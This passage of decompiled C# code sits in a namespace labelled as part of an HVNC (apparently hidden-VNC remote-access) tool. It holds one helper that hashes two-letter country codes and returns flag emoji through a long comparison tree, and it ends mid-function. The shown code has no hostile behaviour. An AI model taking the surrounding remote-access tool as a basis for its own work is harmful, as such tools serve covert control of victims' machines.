namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000D8 RID: 216
	internal sealed class Flags
	{
        internal static uint ComputeStringHash(string string_0)
        {
            uint num = 0;
            if (string_0 != null)
            {
                num = 2166136261U;
                for (int i = 0; i < string_0.Length; i++)
                {
                    num = ((uint)string_0[i] ^ num) * 16777619U;
                }
            }
            return num;
        }
        // Token: 0x060008CC RID: 2252 RVA: 0x0005DC4C File Offset: 0x0005BE4C
        public static string GetFlag(string country)
		{
			uint num = ComputeStringHash(country);
			if (num <= 1088850471U)
			{
				if (num <= 720728591U)
				{
					if (num <= 587199187U)
					{
						if (num <= 517278592U)
						{
							if (num <= 433934950U)
							{
								if (num <= 399246879U)
								{
									if (num != 365691641U)
									{
										if (num != 368398592U)
										{
											if (num == 399246879U)
											{
												if (country == "EE")
												{
													return "\ud83c\uddea\ud83c\uddea";
												}
											}
										}
										else if (country == "TC")
										{
											return "\ud83c\uddf9\ud83c\udde8";
										}
									}
									else if (country == "EC")
									{
										return "\ud83c\uddea\ud83c\udde8";
									}
								}
								else if (num <= 417157331U)
								{
									if (num != 400379712U)
									{
										if (num == 417157331U)
										{
											if (country == "BD")
											{
												return "\ud83c\udde7\ud83c\udde9";
											}
										}
									}
									else if (country == "BE")
									{
										return "\ud83c\udde7\ud83c\uddea";
									}
								}
								else if (num != 432802117U)
								{
									if (num == 433934950U)
									{
										if (country == "BG")
										{
											return "\ud83c\udde7\ud83c\uddec";
										}
									}
								}
								else if (country == "EG")
								{
									return "\ud83c\uddea\ud83c\uddec";
								}
							}
							else if (num <= 452286687U)
							{
								if (num <= 449579736U)
								{
									if (num != 435509068U)
									{
										if (num == 449579736U)
										{
											if (country == "EH")
											{
												return "\ud83c\uddea\ud83c\udded";
											}
										}
									}
									else if (country == "TG")
									{
										return "\ud83c\uddf9\ud83c\uddec";
									}
								}
								else if (num != 450712569U)
								{
									if (num == 452286687U)
									{
										if (country == "TF")
										{
											return "\ud83c\uddf9\ud83c\uddeb";
										}
									}
								}
								else if (country == "BF")
								{
									return "\ud83c\udde7\ud83c\uddeb";
								}
							}
							else if (num <= 485841925U)
							{
								if (num != 467490188U)
								{
									if (num == 485841925U)
									{
										if (country == "TD")
										{
											return "\ud83c\uddf9\ud83c\udde9";
										}
									}
								}
								else if (country == "BA")
								{
									return "\ud83c\udde7\ud83c\udde6";
								}
							}
							else if (num != 502619544U)
							{
								if (num == 517278592U)
								{
									if (country == "AL")
									{
										return "\ud83c\udde6\ud83c\uddf1";
									}
								}
							}
							else if (country == "TK")
							{
								return "\ud83c\uddf9\ud83c\uddf0";
							}
						}
						else if (num <= 551378283U)
						{
							if (num <= 534056211U)
							{
								if (num <= 518955878U)
								{
									if (num != 517823045U)
									{
										if (num == 518955878U)
										{
											if (country == "KH")
											{
												return "\ud83c\uddf0\ud83c\udded";
											}
										}
									}
									else if (country == "BB")
									{
										return "\ud83c\udde7\ud83c\udde7";
									}
								}
								else if (num != 519397163U)
								{
									if (num == 534056211U)
									{
										if (country == "AM")
										{
											return "\ud83c\udde6\ud83c\uddf2";
										}
									}
								}
								else if (country == "TJ")
								{
									return "\ud83c\uddf9\ud83c\uddef";
								}
							}
							else if (num <= 535733497U)
							{
								if (num != 534600664U)
								{
									if (num == 535733497U)
									{
										if (country == "KI")
										{
											return "\ud83c\uddf0\ud83c\uddee";
										}
									}
								}
								else if (country == "BM")
								{
									return "\ud83c\udde7\ud83c\uddf2";
								}
							}
							else if (num != 538440448U)
							{
								if (num == 551378283U)
								{
									if (country == "BL")
									{
										return "\ud83c\udde7\ud83c\uddf1";
									}
								}
							}
							else if (country == "ZM")
							{
								return "\ud83c\uddff\ud83c\uddf2";
							}
						}
						else if (num <= 568155902U)
						{
							if (num <= 552952401U)
							{
								if (num != 552511116U)
								{
									if (num == 552952401U)
									{
										if (country == "TH")
										{
											return "\ud83c\uddf9\ud83c\udded";
										}
									}
								}
								else if (country == "KN")
								{
									return "\ud83c\uddf0\ud83c\uddf3";
								}
							}
							else if (num != 567611449U)
							{
								if (num == 568155902U)
								{
									if (country == "BO")
									{
										return "\ud83c\udde7\ud83c\uddf4";
									}
								}
							}
							else if (country == "AO")
							{
								return "\ud83c\udde6\ud83c\uddf4";
							}
						}
						else if (num <= 584933521U)
						{
							if (num != 569730020U)
							{
								if (num == 584933521U)
								{
									if (country == "BN")
									{
										return "\ud83c\udde7\ud83c\uddf3";
									}
								}
							}
							else if (country == "TO")
							{
								return "\ud83c\uddf9\ud83c\uddf4";
							}
						}
						else if (num != 586507639U)
						{
							if (num == 587199187U)
							{
								if (country == "PN")
								{
									return "\ud83c\uddf5\ud83c\uddf3";
								}
							}
						}
						else if (country == "TN")
						{
							return "\ud83c\uddf9\ud83c\uddf3";
						}
					}
					else if (num <= 652043997U)
					{
						if (num <= 618488759U)
						{
							if (num <= 602843973U)
							{
								if (num != 601166687U)
								{
									if (num != 601711140U)
									{
										if (num == 602843973U)
										{
											if (country == "KM")
											{
												return "\ud83c\uddf0\ud83c\uddf2";
											}
										}
									}
									else if (country == "BI")
									{
										return "\ud83c\udde7\ud83c\uddee";
									}
								}
								else if (country == "AI")
								{
									return "\ud83c\udde6\ud83c\uddee";
								}
							}
							else if (num <= 603976806U)
							{
								if (num != 603285258U)
								{
									if (num == 603976806U)
									{
										if (country == "PM")
										{
											return "\ud83c\uddf5\ud83c\uddf2";
										}
									}
								}
								else if (country == "TM")
								{
									return "\ud83c\uddf9\ud83c\uddf2";
								}
							}
							else if (num != 617355926U)
							{
								if (num == 618488759U)
								{
									if (country == "BH")
									{
										return "\ud83c\udde7\ud83c\udded";
									}
								}
							}
							else if (country == "ER")
							{
								return "\ud83c\uddea\ud83c\uddf7";
							}
						}
						else if (num <= 634133545U)
						{
							if (num <= 620062877U)
							{
								if (num != 619077139U)
								{
									if (num == 620062877U)
									{
										if (country == "TL")
										{
											return "\ud83c\uddf9\ud83c\uddf1";
										}
									}
								}
								else if (country == "NP")
								{
									return "\ud83c\uddf3\ud83c\uddf5";
								}
							}
							else if (num != 620754425U)
							{
								if (num == 634133545U)
								{
									if (country == "ES")
									{
										return "\ud83c\uddea\ud83c\uddf8";
									}
								}
							}
							else if (country == "PL")
							{
								return "\ud83c\uddf5\ud83c\uddf1";
							}
						}
						else if (num <= 650911164U)
						{
							if (num != 637532044U)
							{
								if (num == 650911164U)
								{
									if (country == "ET")
									{
										return "\ud83c\uddea\ud83c\uddf9";
									}
								}
							}
							else if (country == "PK")
							{
								return "\ud83c\uddf5\ud83c\uddf0";
							}
						}
						else if (num != 651499544U)
						{
							if (num == 652043997U)
							{
								if (country == "BJ")
								{
									return "\ud83c\udde7\ud83c\uddef";
								}
							}
						}
						else if (country == "AD")
						{
							return "\ud83c\udde6\ud83c\udde9";
						}
					}
					else if (num <= 687864901U)
					{
						if (num <= 668277163U)
						{
							if (num <= 653618115U)
							{
								if (num != 652632377U)
								{
									if (num == 653618115U)
									{
										if (country == "TR")
										{
											return "\ud83c\uddf9\ud83c\uddf7";
										}
									}
								}
								else if (country == "NR")
								{
									return "\ud83c\uddf3\ud83c\uddf7";
								}
							}
							else if (num != 655442496U)
							{
								if (num == 668277163U)
								{
									if (country == "AE")
									{
										return "\ud83c\udde6\ud83c\uddea";
									}
								}
							}
							else if (country == "YT")
							{
								return "\ud83c\uddfe\ud83c\uddf9";
							}
						}
						else if (num <= 685054782U)
						{
							if (num != 669409996U)
							{
								if (num == 685054782U)
								{
									if (country == "AF")
									{
										return "\ud83c\udde6\ud83c\uddeb";
									}
								}
							}
							else if (country == "NU")
							{
								return "\ud83c\uddf3\ud83c\uddfa";
							}
						}
						else if (num != 685599235U)
						{
							if (num == 687864901U)
							{
								if (country == "PH")
								{
									return "\ud83c\uddf5\ud83c\udded";
								}
							}
						}
						else if (country == "BT")
						{
							return "\ud83c\udde7\ud83c\uddf9";
						}
					}
					else if (num <= 703950972U)
					{
						if (num <= 702376854U)
						{
							if (num != 701832401U)
							{
								if (num == 702376854U)
								{
									if (country == "BW")
									{
										return "\ud83c\udde7\ud83c\uddfc";
									}
								}
							}
							else if (country == "AG")
							{
								return "\ud83c\udde6\ud83c\uddec";
							}
						}
						else if (num != 703509687U)
						{
							if (num == 703950972U)
							{
								if (country == "TW")
								{
									return "\ud83c\uddf9\ud83c\uddfc";
								}
							}
						}
						else if (country == "KG")
						{
							return "\ud83c\uddf0\ud83c\uddec";
						}
					}
					else if (num <= 719154473U)
					{
						if (num != 704642520U)
						{
							if (num == 719154473U)
							{
								if (country == "BV")
								{
									return "\ud83c\udde7\ud83c\uddfb";
								}
							}
						}
						else if (country == "PG")
						{
							return "\ud83c\uddf5\ud83c\uddec";
						}
					}
					else if (num != 719301568U)
					{
						if (num == 720728591U)
						{
							if (country == "TV")
							{
								return "\ud83c\uddf9\ud83c\uddfb";
							}
						}
					}
					else if (country == "MX")
					{
						return "\ud83c\uddf2\ud83c\uddfd";
					}
				}
				else if (num <= 921618734U)
				{
					if (num <= 787839067U)
					{
						if (num <= 752856806U)
						{
							if (num <= 736079187U)
							{
								if (num != 721420139U)
								{
									if (num != 735932092U)
									{
										if (num == 736079187U)
										{
											if (country == "MY")
											{
												return "\ud83c\uddf2\ud83c\uddfe";
											}
										}
									}
									else if (country == "BQ")
									{
										return "\ud83c\udde7\ud83c\uddf6";
									}
								}
								else if (country == "PF")
								{
									return "\ud83c\uddf5\ud83c\uddeb";
								}
							}
							else if (num <= 738197758U)
							{
								if (num != 737064925U)
								{
									if (num == 738197758U)
									{
										if (country == "PE")
										{
											return "\ud83c\uddf5\ud83c\uddea";
										}
									}
								}
								else if (country == "KE")
								{
									return "\ud83c\uddf0\ud83c\uddea";
								}
							}
							else if (num != 739771876U)
							{
								if (num == 752856806U)
								{
									if (country == "MZ")
									{
										return "\ud83c\uddf2\ud83c\uddff";
									}
								}
							}
							else if (country == "ZA")
							{
								return "\ud83c\uddff\ud83c\udde6";
							}
						}
						else if (num <= 771208543U)
						{
							if (num <= 754283829U)
							{
								if (num != 753842544U)
								{
									if (num == 754283829U)
									{
										if (country == "TT")
										{
											return "\ud83c\uddf9\ud83c\uddf9";
										}
									}
								}
								else if (country == "KZ")
								{
									return "\ud83c\uddf0\ud83c\uddff";
								}
							}
							else if (num != 769487330U)
							{
								if (num == 771208543U)
								{
									if (country == "WS")
									{
										return "\ud83c\uddfc\ud83c\uddf8";
									}
								}
							}
							else if (country == "BS")
							{
								return "\ud83c\udde7\ud83c\uddf8";
							}
						}
						else if (num <= 786264949U)
						{
							if (num != 785279211U)
							{
								if (num == 786264949U)
								{
									if (country == "BR")
									{
										return "\ud83c\udde7\ud83c\uddf7";
									}
								}
							}
							else if (country == "DZ")
							{
								return "\ud83c\udde9\ud83c\uddff";
							}
						}
						else if (num != 786853329U)
						{
							if (num == 787839067U)
							{
								if (country == "TZ")
								{
									return "\ud83c\uddf9\ud83c\uddff";
								}
							}
						}
						else if (country == "NZ")
						{
							return "\ud83c\uddf3\ud83c\uddff";
						}
					}
					else if (num <= 886386210U)
					{
						if (num <= 853522520U)
						{
							if (num <= 805308234U)
							{
								if (num != 804175401U)
								{
									if (num == 805308234U)
									{
										if (country == "PA")
										{
											return "\ud83c\uddf5\ud83c\udde6";
										}
									}
								}
								else if (country == "KY")
								{
									return "\ud83c\uddf0\ud83c\uddfe";
								}
							}
							else if (num != 852830972U)
							{
								if (num == 853522520U)
								{
									if (country == "MP")
									{
										return "\ud83c\uddf2\ud83c\uddf5";
									}
								}
							}
							else if (country == "AX")
							{
								return "\ud83c\udde6\ud83c\uddfd";
							}
						}
						else if (num <= 870300139U)
						{
							if (num != 870153044U)
							{
								if (num == 870300139U)
								{
									if (country == "MQ")
									{
										return "\ud83c\uddf2\ud83c\uddf6";
									}
								}
							}
							else if (country == "BY")
							{
								return "\ud83c\udde7\ud83c\uddfe";
							}
						}
						else if (num != 870741424U)
						{
							if (num == 886386210U)
							{
								if (country == "AZ")
								{
									return "\ud83c\udde6\ud83c\uddff";
								}
							}
						}
						else if (country == "NA")
						{
							return "\ud83c\uddf3\ud83c\udde6";
						}
					}
					else if (num <= 904296662U)
					{
						if (num <= 888063496U)
						{
							if (num != 887077758U)
							{
								if (num == 888063496U)
								{
									if (country == "KR")
									{
										return "\ud83c\uddf0\ud83c\uddf7";
									}
								}
							}
							else if (country == "MR")
							{
								return "\ud83c\uddf2\ud83c\uddf7";
							}
						}
						else if (num != 903855377U)
						{
							if (num == 904296662U)
							{
								if (country == "NC")
								{
									return "\ud83c\uddf3\ud83c\udde8";
								}
							}
						}
						else if (country == "MS")
						{
							return "\ud83c\uddf2\ud83c\uddf8";
						}
					}
					else if (num <= 920485901U)
					{
						if (num != 919941448U)
						{
							if (num == 920485901U)
							{
								if (country == "BZ")
								{
									return "\ud83c\udde7\ud83c\uddff";
								}
							}
						}
						else if (country == "AT")
						{
							return "\ud83c\udde6\ud83c\uddf9";
						}
					}
					else if (num != 920632996U)
					{
						if (num == 921618734U)
						{
							if (country == "KP")
							{
								return "\ud83c\uddf0\ud83c\uddf5";
							}
						}
					}
					else if (country == "MT")
					{
						return "\ud83c\uddf2\ud83c\uddf9";
					}
				}
				else if (num <= 1003388258U)
				{
					if (num <= 955762352U)
					{
						if (num <= 937851900U)
						{
							if (num != 936719067U)
							{
								if (num != 937410615U)
								{
									if (num == 937851900U)
									{
										if (country == "NE")
										{
											return "\ud83c\uddf3\ud83c\uddea";
										}
									}
								}
								else if (country == "MU")
								{
									return "\ud83c\uddf2\ud83c\uddfa";
								}
							}
							else if (country == "AU")
							{
								return "\ud83c\udde6\ud83c\uddfa";
							}
						}
						else if (num <= 940662019U)
						{
							if (num != 939529186U)
							{
								if (num == 940662019U)
								{
									if (country == "YE")
									{
										return "\ud83c\uddfe\ud83c\uddea";
									}
								}
							}
							else if (country == "PY")
							{
								return "\ud83c\uddf5\ud83c\uddfe";
							}
						}
						else if (num != 954188234U)
						{
							if (num == 955762352U)
							{
								if (country == "WF")
								{
									return "\ud83c\uddfc\ud83c\uddeb";
								}
							}
						}
						else if (country == "MV")
						{
							return "\ud83c\uddf2\ud83c\uddfb";
						}
					}
					else if (num <= 971951591U)
					{
						if (num <= 970965853U)
						{
							if (num != 970274305U)
							{
								if (num == 970965853U)
								{
									if (country == "MW")
									{
										return "\ud83c\uddf2\ud83c\uddfc";
									}
								}
							}
							else if (country == "AW")
							{
								return "\ud83c\udde6\ud83c\uddfc";
							}
						}
						else if (num != 971407138U)
						{
							if (num == 971951591U)
							{
								if (country == "KW")
								{
									return "\ud83c\uddf0\ud83c\uddfc";
								}
							}
						}
						else if (country == "NG")
						{
							return "\ud83c\uddf3\ud83c\uddec";
						}
					}
					else if (num <= 987743472U)
					{
						if (num != 973084424U)
						{
							if (num == 987743472U)
							{
								if (country == "MH")
								{
									return "\ud83c\uddf2\ud83c\udded";
								}
							}
						}
						else if (country == "PW")
						{
							return "\ud83c\uddf5\ud83c\uddfc";
						}
					}
					else if (num != 988184757U)
					{
						if (num == 1003388258U)
						{
							if (country == "DE")
							{
								return "\ud83c\udde9\ud83c\uddea";
							}
						}
					}
					else if (country == "NF")
					{
						return "\ud83c\uddf3\ud83c\uddeb";
					}
				}
				else if (num <= 1038076329U)
				{
					if (num <= 1022431543U)
					{
						if (num <= 1004962376U)
						{
							if (num != 1003829543U)
							{
								if (num == 1004962376U)
								{
									if (country == "NI")
									{
										return "\ud83c\uddf3\ud83c\uddee";
									}
								}
							}
							else if (country == "AQ")
							{
								return "\ud83c\udde6\ud83c\uddf6";
							}
						}
						else if (num != 1020607162U)
						{
							if (num == 1022431543U)
							{
								if (country == "JP")
								{
									return "\ud83c\uddef\ud83c\uddf5";
								}
							}
						}
						else if (country == "AR")
						{
							return "\ud83c\udde6\ud83c\uddf7";
						}
					}
					else if (num <= 1036943496U)
					{
						if (num != 1023417281U)
						{
							if (num == 1036943496U)
							{
								if (country == "DK")
								{
									return "\ud83c\udde9\ud83c\uddf0";
								}
							}
						}
						else if (country == "PT")
						{
							return "\ud83c\uddf5\ud83c\uddf9";
						}
					}
					else if (num != 1037384781U)
					{
						if (num == 1038076329U)
						{
							if (country == "MK")
							{
								return "\ud83c\uddf2\ud83c\uddf0";
							}
						}
					}
					else if (country == "AS")
					{
						return "\ud83c\udde6\ud83c\uddf8";
					}
				}
				else if (num <= 1056972519U)
				{
					if (num <= 1053721115U)
					{
						if (num != 1040194900U)
						{
							if (num == 1053721115U)
							{
								if (country == "DJ")
								{
									return "\ud83c\udde9\ud83c\uddef";
								}
							}
						}
						else if (country == "PS")
						{
							return "\ud83c\uddf5\ud83c\uddf8";
						}
					}
					else if (num != 1054853948U)
					{
						if (num == 1056972519U)
						{
							if (country == "PR")
							{
								return "\ud83c\uddf5\ud83c\uddf7";
							}
						}
					}
					else if (country == "ML")
					{
						return "\ud83c\uddf2\ud83c\uddf1";
					}
				}
				else if (num <= 1072764400U)
				{
					if (num != 1071631567U)
					{
						if (num == 1072764400U)
						{
							if (country == "JM")
							{
								return "\ud83c\uddef\ud83c\uddf2";
							}
						}
					}
					else if (country == "MM")
					{
						return "\ud83c\uddf2\ud83c\uddf2";
					}
				}
				else if (num != 1088409186U)
				{
					if (num == 1088850471U)
					{
						if (country == "NL")
						{
							return "\ud83c\uddf3\ud83c\uddf1";
						}
					}
				}
				else if (country == "MN")
				{
					return "\ud83c\uddf2\ud83c\uddf3";
				}
			}
			else if (num <= 1761779612U)
			{
				if (num <= 1594003422U)
				{
					if (num <= 1458105184U)
					{
						if (num <= 1172297281U)
						{
							if (num <= 1105628090U)
							{
								if (num != 1104053972U)
								{
									if (num != 1105186805U)
									{
										if (num == 1105628090U)
										{
											if (country == "NO")
											{
												return "\ud83c\uddf3\ud83c\uddf4";
											}
										}
									}
									else if (country == "MO")
									{
										return "\ud83c\uddf2\ud83c\uddf4";
									}
								}
								else if (country == "DO")
								{
									return "\ud83c\udde9\ud83c\uddf4";
								}
							}
							else if (num <= 1137609210U)
							{
								if (num != 1106319638U)
								{
									if (num == 1137609210U)
									{
										if (country == "DM")
										{
											return "\ud83c\udde9\ud83c\uddf2";
										}
									}
								}
								else if (country == "JO")
								{
									return "\ud83c\uddef\ud83c\uddf4";
								}
							}
							else if (num != 1138742043U)
							{
								if (num == 1172297281U)
								{
									if (country == "MC")
									{
										return "\ud83c\uddf2\ud83c\udde8";
									}
								}
							}
							else if (country == "MA")
							{
								return "\ud83c\uddf2\ud83c\udde6";
							}
						}
						else if (num <= 1222630138U)
						{
							if (num <= 1205852519U)
							{
								if (num != 1189074900U)
								{
									if (num == 1205852519U)
									{
										if (country == "ME")
										{
											return "\ud83c\uddf2\ud83c\uddea";
										}
									}
								}
								else if (country == "MD")
								{
									return "\ud83c\uddf2\ud83c\udde9";
								}
							}
							else if (num != 1206985352U)
							{
								if (num == 1222630138U)
								{
									if (country == "MF")
									{
										return "\ud83c\uddf2\ud83c\uddeb";
									}
								}
							}
							else if (country == "JE")
							{
								return "\ud83c\uddef\ud83c\uddea";
							}
						}
						else if (num <= 1426227232U)
						{
							if (num != 1239407757U)
							{
								if (num == 1426227232U)
								{
									if (country == "SB")
									{
										return "\ud83c\uddf8\ud83c\udde7";
									}
								}
							}
							else if (country == "MG")
							{
								return "\ud83c\uddf2\ud83c\uddec";
							}
						}
						else if (num != 1443004851U)
						{
							if (num == 1458105184U)
							{
								if (country == "ID")
								{
									return "\ud83c\uddee\ud83c\udde9";
								}
							}
						}
						else if (country == "SC")
						{
							return "\ud83c\uddf8\ud83c\udde8";
						}
					}
					else if (num <= 1540419161U)
					{
						if (num <= 1506863923U)
						{
							if (num <= 1476560089U)
							{
								if (num != 1474882803U)
								{
									if (num == 1476560089U)
									{
										if (country == "SA")
										{
											return "\ud83c\uddf8\ud83c\udde6";
										}
									}
								}
								else if (country == "IE")
								{
									return "\ud83c\uddee\ud83c\uddea";
								}
							}
							else if (num != 1490086304U)
							{
								if (num == 1506863923U)
								{
									if (country == "GG")
									{
										return "\ud83c\uddec\ud83c\uddec";
									}
								}
							}
							else if (country == "GF")
							{
								return "\ud83c\uddec\ud83c\uddeb";
							}
						}
						else if (num <= 1523641542U)
						{
							if (num != 1510115327U)
							{
								if (num == 1523641542U)
								{
									if (country == "GD")
									{
										return "\ud83c\uddec\ud83c\udde9";
									}
								}
							}
							else if (country == "SG")
							{
								return "\ud83c\uddf8\ud83c\uddec";
							}
						}
						else if (num != 1526892946U)
						{
							if (num == 1540419161U)
							{
								if (country == "GE")
								{
									return "\ud83c\uddec\ud83c\uddea";
								}
							}
						}
						else if (country == "SD")
						{
							return "\ud83c\uddf8\ud83c\udde9";
						}
					}
					else if (num <= 1560448184U)
					{
						if (num <= 1543670565U)
						{
							if (num != 1543126112U)
							{
								if (num == 1543670565U)
								{
									if (country == "SE")
									{
										return "\ud83c\uddf8\ud83c\uddea";
									}
								}
							}
							else if (country == "VI")
							{
								return "\ud83c\uddfb\ud83c\uddee";
							}
						}
						else if (num != 1557196780U)
						{
							if (num == 1560448184U)
							{
								if (country == "SJ")
								{
									return "\ud83c\uddf8\ud83c\uddef";
								}
							}
						}
						else if (country == "GB")
						{
							return "\ud83c\uddec\ud83c\udde7";
						}
					}
					else if (num <= 1577225803U)
					{
						if (num != 1575107232U)
						{
							if (num == 1577225803U)
							{
								if (country == "SK")
								{
									return "\ud83c\uddf8\ud83c\uddf0";
								}
							}
						}
						else if (country == "LK")
						{
							return "\ud83c\uddf1\ud83c\uddf0";
						}
					}
					else if (num != 1592326136U)
					{
						if (num == 1594003422U)
						{
							if (country == "SH")
							{
								return "\ud83c\uddf8\ud83c\udded";
							}
						}
					}
					else if (country == "IL")
					{
						return "\ud83c\uddee\ud83c\uddf1";
					}
				}
				else if (num <= 1677891517U)
				{
					if (num <= 1627558660U)
					{
						if (num <= 1609103755U)
						{
							if (num != 1607529637U)
							{
								if (num != 1608662470U)
								{
									if (num == 1609103755U)
									{
										if (country == "IM")
										{
											return "\ud83c\uddee\ud83c\uddf2";
										}
									}
								}
								else if (country == "LI")
								{
									return "\ud83c\uddf1\ud83c\uddee";
								}
							}
							else if (country == "GA")
							{
								return "\ud83c\uddec\ud83c\udde6";
							}
						}
						else if (num <= 1624307256U)
						{
							if (num != 1610781041U)
							{
								if (num == 1624307256U)
								{
									if (country == "GN")
									{
										return "\ud83c\uddec\ud83c\uddf3";
									}
								}
							}
							else if (country == "SI")
							{
								return "\ud83c\uddf8\ud83c\uddee";
							}
						}
						else if (num != 1625881374U)
						{
							if (num == 1627558660U)
							{
								if (country == "SN")
								{
									return "\ud83c\uddf8\ud83c\uddf3";
								}
							}
						}
						else if (country == "IN")
						{
							return "\ud83c\uddee\ud83c\uddf3";
						}
					}
					else if (num <= 1660569445U)
					{
						if (num <= 1644336279U)
						{
							if (num != 1642658993U)
							{
								if (num == 1644336279U)
								{
									if (country == "SO")
									{
										return "\ud83c\uddf8\ud83c\uddf4";
									}
								}
							}
							else if (country == "IO")
							{
								return "\ud83c\uddee\ud83c\uddf4";
							}
						}
						else if (num != 1657862494U)
						{
							if (num == 1660569445U)
							{
								if (country == "VN")
								{
									return "\ud83c\uddfb\ud83c\uddf3";
								}
							}
						}
						else if (country == "GL")
						{
							return "\ud83c\uddec\ud83c\uddf1";
						}
					}
					else if (num <= 1674640113U)
					{
						if (num != 1661113898U)
						{
							if (num == 1674640113U)
							{
								if (country == "GM")
								{
									return "\ud83c\uddec\ud83c\uddf2";
								}
							}
						}
						else if (country == "SL")
						{
							return "\ud83c\uddf8\ud83c\uddf1";
						}
					}
					else if (num != 1677347064U)
					{
						if (num == 1677891517U)
						{
							if (country == "SM")
							{
								return "\ud83c\uddf8\ud83c\uddf2";
							}
						}
					}
					else if (country == "VA")
					{
						return "\ud83c\uddfb\ud83c\udde6";
					}
				}
				else if (num <= 1724972970U)
				{
					if (num <= 1710461017U)
					{
						if (num <= 1694669136U)
						{
							if (num != 1692006112U)
							{
								if (num == 1694669136U)
								{
									if (country == "SR")
									{
										return "\ud83c\uddf8\ud83c\uddf7";
									}
								}
							}
							else if (country == "CR")
							{
								return "\ud83c\udde8\ud83c\uddf7";
							}
						}
						else if (num != 1709328184U)
						{
							if (num == 1710461017U)
							{
								if (country == "US")
								{
									return "\ud83c\uddfa\ud83c\uddf8";
								}
							}
						}
						else if (country == "LC")
						{
							return "\ud83c\uddf1\ud83c\udde8";
						}
					}
					else if (num <= 1711446755U)
					{
						if (num != 1710902302U)
						{
							if (num == 1711446755U)
							{
								if (country == "SS")
								{
									return "\ud83c\uddf8\ud83c\uddf8";
								}
							}
						}
						else if (country == "VC")
						{
							return "\ud83c\uddfb\ud83c\udde8";
						}
					}
					else if (num != 1712579588U)
					{
						if (num == 1724972970U)
						{
							if (country == "GH")
							{
								return "\ud83c\uddec\ud83c\udded";
							}
						}
					}
					else if (country == "XK")
					{
						return "\ud83c\uddfd\ud83c\uddf0";
					}
				}
				else if (num <= 1742883422U)
				{
					if (num <= 1726547088U)
					{
						if (num != 1726105803U)
						{
							if (num == 1726547088U)
							{
								if (country == "IT")
								{
									return "\ud83c\uddee\ud83c\uddf9";
								}
							}
						}
						else if (country == "LB")
						{
							return "\ud83c\uddf1\ud83c\udde7";
						}
					}
					else if (num != 1741750589U)
					{
						if (num == 1742883422U)
						{
							if (country == "LA")
							{
								return "\ud83c\uddf1\ud83c\udde6";
							}
						}
					}
					else if (country == "GI")
					{
						return "\ud83c\uddec\ud83c\uddee";
					}
				}
				else if (num <= 1745149088U)
				{
					if (num != 1744457540U)
					{
						if (num == 1745149088U)
						{
							if (country == "RU")
							{
								return "\ud83c\uddf7\ud83c\uddfa";
							}
						}
					}
					else if (country == "VE")
					{
						return "\ud83c\uddfb\ud83c\uddea";
					}
				}
				else if (num != 1759116588U)
				{
					if (num == 1761779612U)
					{
						if (country == "SV")
						{
							return "\ud83c\uddf8\ud83c\uddfb";
						}
					}
				}
				else if (country == "CV")
				{
					return "\ud83c\udde8\ud83c\uddfb";
				}
			}
			else if (num <= 1977770088U)
			{
				if (num <= 1827359897U)
				{
					if (num <= 1808861065U)
					{
						if (num <= 1778012778U)
						{
							if (num != 1775305827U)
							{
								if (num != 1775894207U)
								{
									if (num == 1778012778U)
									{
										if (country == "VG")
										{
											return "\ud83c\uddfb\ud83c\uddec";
										}
									}
								}
								else if (country == "CW")
								{
									return "\ud83c\udde8\ud83c\uddfc";
								}
							}
							else if (country == "GW")
							{
								return "\ud83c\uddec\ud83c\uddfc";
							}
						}
						else if (num <= 1792083446U)
						{
							if (num != 1778704326U)
							{
								if (num == 1792083446U)
								{
									if (country == "GT")
									{
										return "\ud83c\uddec\ud83c\uddf9";
									}
								}
							}
							else if (country == "RW")
							{
								return "\ud83c\uddf7\ud83c\uddfc";
							}
						}
						else if (num != 1795334850U)
						{
							if (num == 1808861065U)
							{
								if (country == "GU")
								{
									return "\ud83c\uddec\ud83c\uddfa";
								}
							}
						}
						else if (country == "ST")
						{
							return "\ud83c\uddf8\ud83c\uddf9";
						}
					}
					else if (num <= 1811126731U)
					{
						if (num <= 1810435183U)
						{
							if (num != 1809449445U)
							{
								if (num == 1810435183U)
								{
									if (country == "IQ")
									{
										return "\ud83c\uddee\ud83c\uddf6";
									}
								}
							}
							else if (country == "CU")
							{
								return "\ud83c\udde8\ud83c\uddfa";
							}
						}
						else if (num != 1810582278U)
						{
							if (num == 1811126731U)
							{
								if (country == "UY")
								{
									return "\ud83c\uddfa\ud83c\uddfe";
								}
							}
						}
						else if (country == "HU")
						{
							return "\ud83c\udded\ud83c\uddfa";
						}
					}
					else if (num <= 1826227064U)
					{
						if (num != 1825638684U)
						{
							if (num == 1826227064U)
							{
								if (country == "CZ")
								{
									return "\ud83c\udde8\ud83c\uddff";
								}
							}
						}
						else if (country == "GR")
						{
							return "\ud83c\uddec\ud83c\uddf7";
						}
					}
					else if (num != 1827212802U)
					{
						if (num == 1827359897U)
						{
							if (country == "HT")
							{
								return "\ud83c\udded\ud83c\uddf9";
							}
						}
					}
					else if (country == "IR")
					{
						return "\ud83c\uddee\ud83c\uddf7";
					}
				}
				else if (num <= 1860915135U)
				{
					if (num <= 1843990421U)
					{
						if (num <= 1828890088U)
						{
							if (num != 1827904350U)
							{
								if (num == 1828890088U)
								{
									if (country == "SZ")
									{
										return "\ud83c\uddf8\ud83c\uddff";
									}
								}
							}
							else if (country == "UZ")
							{
								return "\ud83c\uddfa\ud83c\uddff";
							}
						}
						else if (num != 1842416303U)
						{
							if (num == 1843990421U)
							{
								if (country == "IS")
								{
									return "\ud83c\uddee\ud83c\uddf8";
								}
							}
						}
						else if (country == "GS")
						{
							return "\ud83c\uddec\ud83c\uddf8";
						}
					}
					else if (num <= 1859193922U)
					{
						if (num != 1845814802U)
						{
							if (num == 1859193922U)
							{
								if (country == "GP")
								{
									return "\ud83c\uddec\ud83c\uddf5";
								}
							}
						}
						else if (country == "RS")
						{
							return "\ud83c\uddf7\ud83c\uddf8";
						}
					}
					else if (num != 1859782302U)
					{
						if (num == 1860915135U)
						{
							if (country == "HR")
							{
								return "\ud83c\udded\ud83c\uddf7";
							}
						}
					}
					else if (country == "CX")
					{
						return "\ud83c\udde8\ud83c\uddfd";
					}
				}
				else if (num <= 1877104374U)
				{
					if (num <= 1875971541U)
					{
						if (num != 1862445326U)
						{
							if (num == 1875971541U)
							{
								if (country == "GQ")
								{
									return "\ud83c\uddec\ud83c\uddf6";
								}
							}
						}
						else if (country == "SX")
						{
							return "\ud83c\uddf8\ud83c\uddfd";
						}
					}
					else if (num != 1876559921U)
					{
						if (num == 1877104374U)
						{
							if (country == "LY")
							{
								return "\ud83c\uddf1\ud83c\uddfe";
							}
						}
					}
					else if (country == "CY")
					{
